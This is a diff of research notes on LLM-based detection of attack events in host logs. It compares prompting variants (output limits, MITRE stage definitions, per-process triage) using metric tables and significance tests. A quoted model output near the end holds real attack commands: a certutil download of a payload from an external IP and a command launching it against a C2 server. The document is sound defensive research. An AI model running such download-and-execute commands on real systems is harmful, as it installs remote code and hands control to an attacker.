@@ -290,22 +290,319 @@ More seeds would sharpen these estimates but would not address the actual bottle
 
 13 of 63 runs have `_parse_ok: False`: Llama CoT 5/15, Llama GoT 7/15, Qwen GoT 1/6. All 5 Llama CoT failures hit the 1536-token output cap mid-JSON (4 of them a runaway `\\\\` backslash loop on the large scenarios), leaving 0 parsed events, so those runs score 0. CoT is one call with no fallback, so it is hit hardest; GoT failures are its Refine step, which falls back to the pre-refine state and still scores. Excluding parse failures, Llama WS12+Ubuntu event F1 is CoT 0.26 -> 0.32, GoT 0.32 -> 0.36, ToT 0.44 unchanged (no failures). So part of ToT's apparent Llama advantage over CoT is a measurement artifact of the output-token cap, not reasoning. Reported as a limitation; grid not re-run. Tables: `results/review_figures/slide_tables.xlsx` (sheets S7 ParseSensitivity, S10 ParseFailures).
 
-## Improvement round 1 (2026-10-08): output limit + stage definitions
+## Phase 6 -- Improvement variants v2, v3, v4 (2026-10-08)
 
-Two variants, each a full 63-run grid via SLURM job 12622 (A100 80GB, node02, 1h46m). Code: `--variant/--max-tokens/--prompt-variant` in `src/run_grid.py`, per-call context-safe output cap in `src/llm_client.py`, `STAGE_DEFINITIONS` in `src/methods/prompter.py`, comparison in `src/compare_variants.py`, job script `slurm/run_variants.sbatch`. Results: `results/variants/{v2_maxtok4096,v3_stagedefs}/`, paired comparisons in `results/variants/comparison_*.csv`. v1 baseline under `results/` untouched; base prompt verified byte-identical to v1.
+**Why:** the v1 diagnosis (Phase 5) found three separate failures -- only 15% of real attack events detected, near-chance stage labeling, and 13/63 runs hitting the 1,536-token output cap. Each variant below changes exactly one thing relative to the previous one, so its effect can be measured in isolation.
 
-- **v2 (output limit 1536 -> 4096, prompt unchanged):** parse failures 13 -> 7, but no metric changed significantly (all paired Wilcoxon p > 0.1, n=63). Truncation was a measurement artifact, not a real bottleneck. Caveat: v1 ran on RTX 6000 Ada, v2 on A100, so this comparison also includes a hardware change.
-- **v3 (v2 + MITRE stage definitions, same text for all topologies, no dataset-tuned examples):** exact stage recall 0.056 -> 0.123 (p = 0.0015, n=63; survives Bonferroni over the 15 tests). Driven by Llama (0.057 -> 0.134, p = 0.0012; event recall also 0.26 -> 0.33, p = 0.025); Qwen improved 0.054 -> 0.097 but not significantly (n=18). Funnel: detected 16.8% -> 19.9%, exact stage correct among detected 23.8% -> 36.3%, "Initial Access" share of predictions 3.9% -> 7.0% (ground truth 38%, so the label bias is reduced, not removed). v3 vs v2 is like-for-like (same GPU, same output limit).
-- **Remaining parse failures in v3:** all 8 are Llama GoT Refine-step failures; the parser falls back to the pre-Refine state, so these runs still carry 18-29 events and are scored normally. Llama CoT's empty-output failures (whitespace/backslash loops) dropped from 4 in v2 to 0 in v3.
-- **Topology still has no significant effect under v3** (paired Wilcoxon, all p >= 0.06, every model/metric/slice). The first significant result in the project comes from the prompt, not the reasoning structure -- consistent with the earlier diagnosis that the bottleneck is upstream of topology.
+**Rules every variant follows:**
+- The change is applied identically to CoT, ToT and GoT, so within a variant topology is still the only difference.
+- Results go to `results/variants/<name>/` (`grid_results.csv` + `raw/`). The v1 baseline under `results/` is never written to: `run_grid.py` refuses non-default settings without `--variant`.
+- The v1 prompt is verified byte-identical to the committed version, so v1 stays reproducible.
+- Every raw run JSON records its settings in a `meta` block: variant, max_tokens, prompt_variant, triage, GPU model.
+- Same grid as v1: 63 runs (Llama on 5 scenarios, Qwen on WS12+Ubuntu, 3 methods, seeds 0-2), temperature 0.7, scored by the locked scorer against the full evidence.
 
-## Improvement round 2 (2026-10-08): triage, then label (v4)
+### Variants and how they were run
 
-v4 = v3 settings (output limit 4096, stage definitions) plus a triage pre-pass (`src/methods/triage.py`, `--triage` in `src/run_grid.py`). The same model judges each process individually, shown with its parent chain; flagged processes are kept with their ancestors and everything else is dropped before CoT/ToT/GoT run. Triage runs once per (scenario, model, seed) and is persisted under `results/variants/v4_triage/triage/`, so all three topologies reason over identical filtered evidence; scoring (including hallucination) still uses the full evidence. SLURM job 12629, A100 80GB, 54 min, via the new generic `slurm/run_grid.sbatch`.
+| Variant | Change vs previous | `src/run_grid.py` arguments | SLURM job | GPU | Wall time |
+|---|---|---|---|---|---|
+| v1_baseline | -- (Phase 5) | (defaults) | direct run | RTX 6000 Ada 48GB | ~1 GPU-hour |
+| v2_maxtok4096 | output limit 1,536 -> 4,096 tokens | `--variant v2_maxtok4096 --max-tokens 4096` | 12622 | A100 80GB (node02) | 1h46m for v2+v3 |
+| v3_stagedefs | + MITRE stage definitions in the shared prompt | `--variant v3_stagedefs --max-tokens 4096 --prompt-variant stagedefs` | 12622 | A100 80GB (node02) | (same job) |
+| v4_triage | + per-process triage before reasoning | `--variant v4_triage --max-tokens 4096 --prompt-variant stagedefs --triage` | 12629 | A100 80GB (node02) | 54 min |
 
-- **First design rejected before the full run:** triaging whole root subtrees kept 69-99% of the text, because busy benign trees (WS12's Chrome tree is 44% of its evidence) are flagged as a unit. Per-process triage keeps 44-74%.
-- **Triage safety:** ground truth kept in full in 15 of 21 triage passes; the other 6 lost exactly one event each (all on the large Windows 10 scenarios).
-- **Effect vs v3 (paired Wilcoxon, n=63):** event F1 0.268 -> 0.325 (p = 0.08), event recall 0.334 -> 0.390 (p = 0.08), event precision 0.245 -> 0.329 (p = 0.04), exact stage recall 0.123 -> 0.147 (p = 0.34). A consistent positive trend, but only precision crosses 0.05 and it would not survive correction for the number of tests. Funnel: detected 19.9% -> 21.3%, so the gain is mostly fewer false positives (benign activity removed), not more attack events found.
-- **Cost:** including triage (9,306 batched calls, 3.1M tokens, 109 s total), 113K tokens/run vs 91K for v3, at similar wall-clock time (46.6 vs 44.6 s/run) because triage batches well.
-- **Topology still not significant under v4** (all p >= 0.055). Notably, CoT is now Llama's best event-F1 method (0.44 on WS12+Ubuntu).
-- Shared-log scenarios (Sidewinder/FIN6/APT29) got slightly different triage results at the same seed (e.g. 463/467/466 processes kept), so batched GPU inference is not bit-reproducible -- expected, but worth knowing.
+- **Job scripts:** `slurm/run_variants.sbatch` (v2 and v3 back to back) and `slurm/run_grid.sbatch` (generic; its arguments pass straight through to `run_grid.py`). Both size vLLM's memory share from the GPU's actual free memory (capped at 0.85), fail fast if torch can't see the GPU, and set `HF_HUB_OFFLINE=1`.
+- **Comparison:** `src/compare_variants.py v1_baseline v2_maxtok4096 v3_stagedefs v4_triage` prints per-variant summaries and writes `results/variants/comparison_<a>_vs_<b>.csv` for each consecutive pair.
+
+### v2 -- output limit 1,536 -> 4,096
+
+- **Change:** `run_grid.py --max-tokens`. `llm_client.py` now clamps each call's output to `max_model_len - prompt_length - 16`, because Llama's ~58K-token scenarios leave only a few thousand tokens under its 65,536 cap.
+- **Bug caught before running:** under transformers 5.14, `apply_chat_template(..., tokenize=True)` returns a `BatchEncoding`, whose `len()` is 2 (its key count), not the token count, so the clamp would silently have done nothing. Fixed with `return_dict=False`; the resulting counts (Qwen 20,001 / Llama 16,232 tokens for WS12) match the prompt sizes vLLM reported in v1.
+- **Result:** parse failures 13 -> 7, but no metric changed significantly (all paired p > 0.1). The truncation was a measurement artifact, not a real bottleneck. Some remaining failures are Llama CoT runs that degenerate into whitespace/newline loops until the cap; more tokens don't fix a loop.
+- **Caveat:** v1 ran on an RTX 6000 Ada and v2 on an A100, so v1 -> v2 also includes a hardware change.
+
+### v3 -- MITRE stage definitions in the shared prompt
+
+- **Change:** `STAGE_DEFINITIONS` in `src/methods/prompter.py`, enabled by `--prompt-variant stagedefs`. The stage list in the task preamble -- used by the generate, aggregate and refine prompts alike -- becomes:
+
+```
+- Initial Access: the adversary gets its first foothold on the host or network
+- Execution: the adversary runs adversary-controlled code
+- Persistence: the adversary keeps its foothold across restarts, changed credentials, or other interruptions
+- Privilege Escalation: the adversary gains higher-level permissions
+- Defense Evasion: the adversary avoids being detected or blocked
+- Credential Access: the adversary steals account names, passwords, or other credentials
+- Discovery: the adversary learns about the host and network environment
+- Lateral Movement: the adversary moves from this host to other systems
+- Collection: the adversary gathers data of interest to its goal
+- Command and Control: the adversary communicates with compromised systems to control them
+Choose the stage by the attacker's goal at that step, not by which tool was used.
+```
+
+- **Deliberately not included:** examples tuned to NODLINK's labeling conventions (e.g. "recon commands count as Initial Access"). That would be fitting the prompt to the test set. The definitions are paraphrased from MITRE ATT&CK's own one-line tactic descriptions, and none of the definition phrases appear in any scenario's evidence.
+- **Result:** exact stage recall 0.056 -> 0.123 (p = 0.0015, n = 63) -- the project's first statistically significant improvement, and it survives Bonferroni correction over the 15 tests in that comparison.
+  - Driven by Llama: stage recall 0.057 -> 0.134 (p = 0.0012); event recall 0.263 -> 0.333 (p = 0.025).
+  - Qwen: 0.054 -> 0.097, not significant at n = 18.
+  - Exact-stage accuracy among detected events: 23.8% -> 36.3%. Llama CoT's empty-output parse failures: 4 -> 0.
+- **Side effect worth knowing:** standard MITRE definitions can pull labels *away* from NODLINK's conventions. MITRE files a `certutil` download under Command and Control ("Ingress Tool Transfer"); NODLINK labels the same step Initial Access. The example run in the results below shows exactly this flip.
+
+### v4 -- triage before reasoning
+
+- **Change:** `src/methods/triage.py`, enabled by `--triage`. Before CoT/ToT/GoT run, the same model judges every process in the serialized evidence individually, shown with its parent chain (nearest parent first, each line truncated to 300 characters), with output constrained to the JSON schema `{"reason": string, "suspicious": boolean}`.
+  - Flagged processes are kept together with all their ancestors, so the kept text is still a readable tree; everything else is dropped.
+  - An unparseable verdict keeps the process, so a formatting failure can never become a silent miss.
+  - All calls for one triage pass go to vLLM as a single batch (`VLLMLanguageModel.query_batch`).
+- **Triage prompt** (per process):
+
+```
+You are a security analyst triaging a host's activity log, one process at a time. Below is one process with any external network connections or suspicious file writes it made, followed by the chain of parent processes that led to it. Decide whether THIS process is likely part of a malicious attack, as opposed to normal user, system, or administrative activity.
+
+Respond with ONLY a JSON object: {"reason": "<one sentence>", "suspicious": true or false}
+
+Process:
+<process line, plus its 'connected to' / 'wrote' lines>
+
+Parent chain (nearest parent first):
+<parent chain, one process per line>
+```
+
+- **Shared across topologies:** triage runs once per (scenario, model, seed) and is saved to `results/variants/v4_triage/triage/<scenario>__<model>__seed<N>.json` (flagged process indices, sizes, ground-truth survival, triage cost). All three methods reuse it, including after a job restart. Triage cost is recorded there, not in the per-run CSV; it is added back in the cost figures below. Only the flags are stored, not the model's one-sentence reasons.
+- **First design rejected before the full run:** judging whole root subtrees (probe on WS12, Ubuntu and APT29, both models, 2 seeds) kept 69-99% of the text, because busy benign trees are flagged as a unit -- WS12's Chrome tree alone is 44% of its evidence. Per-process triage keeps 44-74%.
+- **Bug caught before running:** the first per-process version counted the `└─` marker as an extra indentation level, so a process's *sibling* appeared in its parent chain (certutil's "parent" was taskkill). Fixed and checked against the known attack chain (PAExec -> cmd -> agent.exe -> cmd -> cmd 1996).
+- **Result vs v3:**
+  - Event F1 0.268 -> 0.325 (p = 0.08); event recall 0.334 -> 0.390 (p = 0.08); exact stage recall 0.123 -> 0.147 (p = 0.34).
+  - Event precision 0.245 -> 0.329 (p = 0.04) -- the only change below 0.05, and it would not survive correction for multiple tests.
+  - Detection barely moves (19.9% -> 21.3%), so the gain is mostly fewer false positives -- benign activity removed before the model sees it -- not more attack events found.
+- **Cost:** triage across all 21 passes is 9,306 calls, 3.1M tokens, 109 s. Including it, v4 averages 113K tokens/run vs 91K for v3 (+24%) at similar wall time (46.6 vs 44.6 s/run), because triage batches well. The reasoning step itself gets cheaper (CoT on WS12+Ubuntu: ~19-22K -> ~12-13K tokens per run).
+- **Reproducibility note:** Sidewinder, FIN6 and APT29 share identical evidence, yet triage at the same seed flagged slightly different sets (463 / 467 / 466 processes at seed 0). Batched GPU inference is not bit-reproducible; seeds are replicates, not exact replays.
+
+### Results
+
+#### All variants at a glance (all 63 runs each)
+
+| Variant | Runs | Parse failures | Event F1 | Event precision | Event recall | Stage recall (exact) | Stage recall (partial) | Hallucination rate |
+|---|---|---|---|---|---|---|---|---|
+| v1_baseline | 63 | 13 | 0.227 | 0.212 | 0.279 | 0.043 | 0.134 | 0.147 |
+| v2_maxtok4096 | 63 | 7 | 0.239 | 0.231 | 0.295 | 0.056 | 0.147 | 0.130 |
+| v3_stagedefs | 63 | 8 | 0.268 | 0.245 | 0.334 | 0.123 | 0.177 | 0.141 |
+| v4_triage | 63 | 8 | 0.325 | 0.329 | 0.390 | 0.147 | 0.212 | 0.144 |
+
+#### Detection funnel (ground-truth events across all 63 runs; ground truth is 38% Initial Access on WS12+Ubuntu)
+
+| Variant | GT events checked | Detected | Exact stage correct | Detected AND correct (of all) | Initial Access share of predictions |
+|---|---|---|---|---|---|
+| v1_baseline | 900 | 138 (15.3%) | 28 (20.3% of detected) | 3.1% | 2.9% |
+| v2_maxtok4096 | 900 | 151 (16.8%) | 36 (23.8% of detected) | 4.0% | 3.9% |
+| v3_stagedefs | 900 | 179 (19.9%) | 65 (36.3% of detected) | 7.2% | 7.0% |
+| v4_triage | 900 | 192 (21.3%) | 67 (34.9% of detected) | 7.4% | 9.5% |
+
+#### Per method and model, WS12 + Ubuntu (mean of 6 runs per cell)
+
+| Variant | Method | Model | Event F1 | Stage recall (exact) | Stage recall (partial) | Tokens/run | Seconds/run |
+|---|---|---|---|---|---|---|---|
+| v1_baseline | CoT | llama3.1-8b | 0.26 | 0.12 | 0.18 | 19,092 | 21.50 |
+| v1_baseline | CoT | qwen2.5-7b | 0.25 | 0.00 | 0.09 | 22,271 | 15.10 |
+| v1_baseline | GoT | llama3.1-8b | 0.32 | 0.07 | 0.25 | 44,170 | 84.40 |
+| v1_baseline | GoT | qwen2.5-7b | 0.38 | 0.08 | 0.26 | 50,240 | 68.80 |
+| v1_baseline | ToT | llama3.1-8b | 0.44 | 0.03 | 0.25 | 76,600 | 28.60 |
+| v1_baseline | ToT | qwen2.5-7b | 0.27 | 0.00 | 0.09 | 89,519 | 16.00 |
+| v2_maxtok4096 | CoT | llama3.1-8b | 0.34 | 0.03 | 0.16 | 19,395 | 16.90 |
+| v2_maxtok4096 | CoT | qwen2.5-7b | 0.22 | 0.00 | 0.09 | 22,253 | 9.00 |
+| v2_maxtok4096 | GoT | llama3.1-8b | 0.24 | 0.15 | 0.27 | 44,984 | 62.70 |
+| v2_maxtok4096 | GoT | qwen2.5-7b | 0.40 | 0.13 | 0.33 | 50,461 | 43.10 |
+| v2_maxtok4096 | ToT | llama3.1-8b | 0.44 | 0.03 | 0.22 | 76,010 | 15.60 |
+| v2_maxtok4096 | ToT | qwen2.5-7b | 0.28 | 0.03 | 0.13 | 89,854 | 17.10 |
+| v3_stagedefs | CoT | llama3.1-8b | 0.29 | 0.14 | 0.22 | 18,970 | 9.70 |
+| v3_stagedefs | CoT | qwen2.5-7b | 0.25 | 0.05 | 0.12 | 22,500 | 10.30 |
+| v3_stagedefs | GoT | llama3.1-8b | 0.32 | 0.17 | 0.30 | 45,381 | 59.80 |
+| v3_stagedefs | GoT | qwen2.5-7b | 0.25 | 0.20 | 0.24 | 50,752 | 39.60 |
+| v3_stagedefs | ToT | llama3.1-8b | 0.47 | 0.21 | 0.32 | 76,087 | 14.50 |
+| v3_stagedefs | ToT | qwen2.5-7b | 0.39 | 0.05 | 0.18 | 89,651 | 12.20 |
+| v4_triage | CoT | llama3.1-8b | 0.44 | 0.26 | 0.34 | 11,971 | 10.90 |
+| v4_triage | CoT | qwen2.5-7b | 0.39 | 0.13 | 0.23 | 12,933 | 7.40 |
+| v4_triage | GoT | llama3.1-8b | 0.26 | 0.26 | 0.35 | 33,747 | 75.70 |
+| v4_triage | GoT | qwen2.5-7b | 0.38 | 0.17 | 0.25 | 32,562 | 41.00 |
+| v4_triage | ToT | llama3.1-8b | 0.42 | 0.20 | 0.31 | 47,911 | 14.10 |
+| v4_triage | ToT | qwen2.5-7b | 0.43 | 0.16 | 0.25 | 51,776 | 9.20 |
+
+#### Llama 3.1 8B, all 5 scenarios, by method (mean of 15 runs per cell)
+
+| Variant | Method | Event F1 | Stage recall (exact) | Tokens/run |
+|---|---|---|---|---|
+| v1_baseline | CoT | 0.154 | 0.069 | 43,545 |
+| v1_baseline | GoT | 0.222 | 0.053 | 93,950 |
+| v1_baseline | ToT | 0.218 | 0.025 | 173,725 |
+| v2_maxtok4096 | CoT | 0.205 | 0.033 | 44,097 |
+| v2_maxtok4096 | GoT | 0.185 | 0.097 | 96,206 |
+| v2_maxtok4096 | ToT | 0.256 | 0.041 | 175,399 |
+| v3_stagedefs | CoT | 0.195 | 0.104 | 43,739 |
+| v3_stagedefs | GoT | 0.299 | 0.169 | 97,974 |
+| v3_stagedefs | ToT | 0.275 | 0.129 | 176,293 |
+| v4_triage | CoT | 0.355 | 0.151 | 31,145 |
+| v4_triage | GoT | 0.236 | 0.169 | 71,708 |
+| v4_triage | ToT | 0.294 | 0.114 | 125,061 |
+
+#### Paired comparisons between consecutive variants (Wilcoxon signed-rank, pairs matched on scenario, method, model, seed)
+
+| Comparison | Scope | Metric | Before | After | Mean diff | Wilcoxon p |
+|---|---|---|---|---|---|---|
+| v1_baseline -> v2_maxtok4096 | all (n=63) | event_f1 | 0.2270 | 0.2390 | 0.0120 | 0.6114 |
+| v1_baseline -> v2_maxtok4096 | all (n=63) | event_precision | 0.2120 | 0.2310 | 0.0190 | 0.5467 |
+| v1_baseline -> v2_maxtok4096 | all (n=63) | event_recall | 0.2790 | 0.2950 | 0.0160 | 0.5439 |
+| v1_baseline -> v2_maxtok4096 | all (n=63) | stage_recall | 0.0430 | 0.0560 | 0.0140 | 0.1011 |
+| v1_baseline -> v2_maxtok4096 | Qwen (n=18) | event_f1 | 0.3000 | 0.2990 | -0.0010 | 0.8240 |
+| v1_baseline -> v2_maxtok4096 | Qwen (n=18) | event_precision | 0.2790 | 0.2620 | -0.0180 | 0.8240 |
+| v1_baseline -> v2_maxtok4096 | Qwen (n=18) | event_recall | 0.3450 | 0.3750 | 0.0300 | 0.3135 |
+| v1_baseline -> v2_maxtok4096 | Qwen (n=18) | stage_recall | 0.0260 | 0.0540 | 0.0280 | 0.1025 |
+| v1_baseline -> v2_maxtok4096 | Llama (n=45) | event_f1 | 0.1980 | 0.2150 | 0.0170 | 0.6291 |
+| v1_baseline -> v2_maxtok4096 | Llama (n=45) | event_precision | 0.1850 | 0.2190 | 0.0340 | 0.4047 |
+| v1_baseline -> v2_maxtok4096 | Llama (n=45) | event_recall | 0.2530 | 0.2630 | 0.0100 | 0.8123 |
+| v1_baseline -> v2_maxtok4096 | Llama (n=45) | stage_recall | 0.0490 | 0.0570 | 0.0080 | 0.3080 |
+| v2_maxtok4096 -> v3_stagedefs | all (n=63) | event_f1 | 0.2390 | 0.2680 | 0.0280 | 0.1038 |
+| v2_maxtok4096 -> v3_stagedefs | all (n=63) | event_precision | 0.2310 | 0.2450 | 0.0130 | 0.4232 |
+| v2_maxtok4096 -> v3_stagedefs | all (n=63) | event_recall | 0.2950 | 0.3340 | 0.0390 | 0.0515 |
+| v2_maxtok4096 -> v3_stagedefs | all (n=63) | stage_recall | 0.0560 | 0.1230 | 0.0670 | 0.0015 |
+| v2_maxtok4096 -> v3_stagedefs | Qwen (n=18) | event_f1 | 0.2990 | 0.2960 | -0.0030 | 0.7564 |
+| v2_maxtok4096 -> v3_stagedefs | Qwen (n=18) | event_precision | 0.2620 | 0.2810 | 0.0190 | 0.7173 |
+| v2_maxtok4096 -> v3_stagedefs | Qwen (n=18) | event_recall | 0.3750 | 0.3360 | -0.0390 | 0.9750 |
+| v2_maxtok4096 -> v3_stagedefs | Qwen (n=18) | stage_recall | 0.0540 | 0.0970 | 0.0430 | 0.3615 |
+| v2_maxtok4096 -> v3_stagedefs | Llama (n=45) | event_f1 | 0.2150 | 0.2560 | 0.0410 | 0.0761 |
+| v2_maxtok4096 -> v3_stagedefs | Llama (n=45) | event_precision | 0.2190 | 0.2300 | 0.0110 | 0.5090 |
+| v2_maxtok4096 -> v3_stagedefs | Llama (n=45) | event_recall | 0.2630 | 0.3330 | 0.0700 | 0.0254 |
+| v2_maxtok4096 -> v3_stagedefs | Llama (n=45) | stage_recall | 0.0570 | 0.1340 | 0.0770 | 0.0012 |
+| v3_stagedefs -> v4_triage | all (n=63) | event_f1 | 0.2680 | 0.3250 | 0.0570 | 0.0802 |
+| v3_stagedefs -> v4_triage | all (n=63) | event_precision | 0.2450 | 0.3290 | 0.0850 | 0.0400 |
+| v3_stagedefs -> v4_triage | all (n=63) | event_recall | 0.3340 | 0.3900 | 0.0550 | 0.0762 |
+| v3_stagedefs -> v4_triage | all (n=63) | stage_recall | 0.1230 | 0.1470 | 0.0240 | 0.3445 |
+| v3_stagedefs -> v4_triage | Qwen (n=18) | event_f1 | 0.2960 | 0.3990 | 0.1030 | 0.1187 |
+| v3_stagedefs -> v4_triage | Qwen (n=18) | event_precision | 0.2810 | 0.4570 | 0.1760 | 0.0340 |
+| v3_stagedefs -> v4_triage | Qwen (n=18) | event_recall | 0.3360 | 0.4120 | 0.0760 | 0.1841 |
+| v3_stagedefs -> v4_triage | Qwen (n=18) | stage_recall | 0.0970 | 0.1540 | 0.0570 | 0.2463 |
+| v3_stagedefs -> v4_triage | Llama (n=45) | event_f1 | 0.2560 | 0.2950 | 0.0390 | 0.3044 |
+| v3_stagedefs -> v4_triage | Llama (n=45) | event_precision | 0.2300 | 0.2780 | 0.0480 | 0.3212 |
+| v3_stagedefs -> v4_triage | Llama (n=45) | event_recall | 0.3330 | 0.3810 | 0.0470 | 0.2064 |
+| v3_stagedefs -> v4_triage | Llama (n=45) | stage_recall | 0.1340 | 0.1450 | 0.0110 | 0.8504 |
+
+#### Topology comparisons within each variant (Wilcoxon, paired on scenario+seed; cells show mean difference and p)
+
+| Variant | Slice | Metric | CoT - ToT | CoT - GoT | ToT - GoT |
+|---|---|---|---|---|---|
+| v1_baseline | Qwen, WS12+Ubuntu (n=6) | event_f1 | -0.03 (p=1.00) | -0.13 (p=0.16) | -0.11 (p=0.22) |
+| v1_baseline | Qwen, WS12+Ubuntu (n=6) | stage_recall | +0.00 (p=1.00) | -0.08 (p=0.25) | -0.08 (p=0.25) |
+| v1_baseline | Llama, all 5 (n=15) | event_f1 | -0.06 (p=0.18) | -0.07 (p=0.23) | -0.00 (p=0.85) |
+| v1_baseline | Llama, all 5 (n=15) | stage_recall | +0.04 (p=0.16) | +0.02 (p=0.74) | -0.03 (p=0.50) |
+| v2_maxtok4096 | Qwen, WS12+Ubuntu (n=6) | event_f1 | -0.06 (p=0.62) | -0.18 (p=0.09) | -0.12 (p=0.22) |
+| v2_maxtok4096 | Qwen, WS12+Ubuntu (n=6) | stage_recall | -0.03 (p=1.00) | -0.13 (p=0.12) | -0.11 (p=0.25) |
+| v2_maxtok4096 | Llama, all 5 (n=15) | event_f1 | -0.05 (p=0.46) | +0.02 (p=0.73) | +0.07 (p=0.28) |
+| v2_maxtok4096 | Llama, all 5 (n=15) | stage_recall | -0.01 (p=0.67) | -0.06 (p=0.02) | -0.06 (p=0.07) |
+| v3_stagedefs | Qwen, WS12+Ubuntu (n=6) | event_f1 | -0.14 (p=0.12) | -0.00 (p=0.81) | +0.14 (p=0.16) |
+| v3_stagedefs | Qwen, WS12+Ubuntu (n=6) | stage_recall | +0.00 (p=1.00) | -0.15 (p=0.25) | -0.15 (p=0.25) |
+| v3_stagedefs | Llama, all 5 (n=15) | event_f1 | -0.08 (p=0.08) | -0.10 (p=0.09) | -0.02 (p=0.89) |
+| v3_stagedefs | Llama, all 5 (n=15) | stage_recall | -0.02 (p=0.44) | -0.06 (p=0.13) | -0.04 (p=0.62) |
+| v4_triage | Qwen, WS12+Ubuntu (n=6) | event_f1 | -0.05 (p=0.75) | +0.01 (p=1.00) | +0.05 (p=0.69) |
+| v4_triage | Qwen, WS12+Ubuntu (n=6) | stage_recall | -0.02 (p=0.75) | -0.03 (p=0.88) | -0.01 (p=0.88) |
+| v4_triage | Llama, all 5 (n=15) | event_f1 | +0.06 (p=0.16) | +0.12 (p=0.17) | +0.06 (p=0.42) |
+| v4_triage | Llama, all 5 (n=15) | stage_recall | +0.04 (p=0.21) | -0.02 (p=0.81) | -0.06 (p=0.05) |
+
+#### v4 triage outputs per pass (`results/variants/v4_triage/triage/*.json`)
+
+| Scenario | Model | Seed | Processes flagged | Kept incl. ancestors | Text kept | GT events kept | Calls | Tokens | Seconds |
+|---|---|---|---|---|---|---|---|---|---|
+| APT29 | llama3.1-8b | seed0 | 466/624 | 477 | 74% | 37/37 | 624 | 208,208 | 12.0 |
+| APT29 | llama3.1-8b | seed1 | 438/624 | 446 | 65% | 36/37 | 624 | 208,433 | 5.1 |
+| APT29 | llama3.1-8b | seed2 | 446/624 | 459 | 68% | 36/37 | 624 | 208,553 | 5.1 |
+| FIN6 | llama3.1-8b | seed0 | 467/624 | 479 | 74% | 23/23 | 624 | 208,279 | 12.0 |
+| FIN6 | llama3.1-8b | seed1 | 440/624 | 449 | 69% | 23/23 | 624 | 208,238 | 5.1 |
+| FIN6 | llama3.1-8b | seed2 | 451/624 | 464 | 69% | 22/23 | 624 | 208,477 | 5.1 |
+| Sidewinder | llama3.1-8b | seed0 | 463/624 | 475 | 74% | 14/14 | 624 | 208,365 | 12.1 |
+| Sidewinder | llama3.1-8b | seed1 | 433/624 | 442 | 68% | 13/14 | 624 | 208,367 | 5.1 |
+| Sidewinder | llama3.1-8b | seed2 | 439/624 | 451 | 67% | 13/14 | 624 | 208,520 | 5.1 |
+| Ubuntu | llama3.1-8b | seed0 | 203/381 | 224 | 62% | 6/6 | 381 | 125,456 | 7.0 |
+| Ubuntu | llama3.1-8b | seed1 | 207/381 | 229 | 64% | 6/6 | 381 | 125,790 | 3.0 |
+| Ubuntu | llama3.1-8b | seed2 | 203/381 | 215 | 58% | 6/6 | 381 | 125,563 | 2.9 |
+| Ubuntu | qwen2.5-7b | seed0 | 172/381 | 185 | 62% | 6/6 | 381 | 131,767 | 6.9 |
+| Ubuntu | qwen2.5-7b | seed1 | 182/381 | 199 | 58% | 6/6 | 381 | 131,712 | 2.5 |
+| Ubuntu | qwen2.5-7b | seed2 | 175/381 | 197 | 58% | 6/6 | 381 | 131,992 | 2.5 |
+| WS12 | llama3.1-8b | seed0 | 153/234 | 158 | 60% | 6/6 | 234 | 75,136 | 5.8 |
+| WS12 | llama3.1-8b | seed1 | 128/234 | 134 | 47% | 6/6 | 234 | 75,030 | 1.7 |
+| WS12 | llama3.1-8b | seed2 | 130/234 | 136 | 46% | 6/6 | 234 | 74,860 | 1.7 |
+| WS12 | qwen2.5-7b | seed0 | 130/234 | 138 | 51% | 6/6 | 234 | 80,725 | 5.2 |
+| WS12 | qwen2.5-7b | seed1 | 128/234 | 136 | 49% | 6/6 | 234 | 80,528 | 1.3 |
+| WS12 | qwen2.5-7b | seed2 | 122/234 | 129 | 44% | 6/6 | 234 | 80,719 | 1.9 |
+
+#### Example: the same run (WS12 / CoT / Llama 3.1 8B / seed 0) across variants, scored against WS12 ground truth
+
+| Variant | GT | Ground-truth command | True stage | Model's stage | Outcome |
+|---|---|---|---|---|---|
+| v2_maxtok4096 | A1 | ping www.baidu.com -c 1 | Initial Access | - | missed |
+| v2_maxtok4096 | A2 | sangforcat.exe | Initial Access | Initial Access | correct |
+| v2_maxtok4096 | A3 | WinBrute.exe | Credential Access | - | missed |
+| v2_maxtok4096 | A4 | Execution Options\sethc.exe | Persistence | - | missed |
+| v2_maxtok4096 | A5 | nbtscan.exe | Discovery | - | missed |
+| v2_maxtok4096 | A6 | PAExec.exe \\192.168.0.244 | Lateral Movement | - | missed |
+| v2_maxtok4096 |  | (7 events flagged in total) |  |  |  |
+| v3_stagedefs | A1 | ping www.baidu.com -c 1 | Initial Access | - | missed |
+| v3_stagedefs | A2 | sangforcat.exe | Initial Access | Command and Control | wrong stage |
+| v3_stagedefs | A3 | WinBrute.exe | Credential Access | - | missed |
+| v3_stagedefs | A4 | Execution Options\sethc.exe | Persistence | - | missed |
+| v3_stagedefs | A5 | nbtscan.exe | Discovery | - | missed |
+| v3_stagedefs | A6 | PAExec.exe \\192.168.0.244 | Lateral Movement | - | missed |
+| v3_stagedefs |  | (15 events flagged in total) |  |  |  |
+| v4_triage | A1 | ping www.baidu.com -c 1 | Initial Access | - | missed |
+| v4_triage | A2 | sangforcat.exe | Initial Access | Initial Access | correct |
+| v4_triage | A3 | WinBrute.exe | Credential Access | - | missed |
+| v4_triage | A4 | Execution Options\sethc.exe | Persistence | Persistence | correct |
+| v4_triage | A5 | nbtscan.exe | Discovery | Defense Evasion | wrong stage |
+| v4_triage | A6 | PAExec.exe \\192.168.0.244 | Lateral Movement | - | missed |
+| v4_triage |  | (11 events flagged in total) |  |  |  |
+
+Excerpt of that run's v3 output (first 3 events + narrative):
+
+```json
+{
+  "malicious_events": [
+    {
+      "command": "taskkill /f /im agent.exe",
+      "stage": "Defense Evasion"
+    },
+    {
+      "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+      "stage": "Command and Control"
+    },
+    {
+      "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.224.153.87:8443",
+      "stage": "Command and Control"
+    }
+  ],
+  "narrative": "The attackers use an unknown Chrome extension as a vector to deliver additional payloads, including the PHP Study Exploit using Python scripts and other tools such as Cert Util and Task Kill. They also use PowerShell to create new accounts and move laterally within the network. The attack chain includes Initial Access via phishing or exploitation of vulnerabilities, Execution of the payload, followed by Privilege Escalation through adding users to admin groups. Credential access follows when they add new users, leading to Lateral Movement and Command and Control activities."
+}
+```
+
+Example triage decisions (WS12 / Llama / seed 0) for a few processes:
+
+| Process | Triage decision |
+|---|---|
+| cmd.exe (PID 1996): "cmd.exe /c "taskkill /f /im agent.exe&certutil -u | flagged |
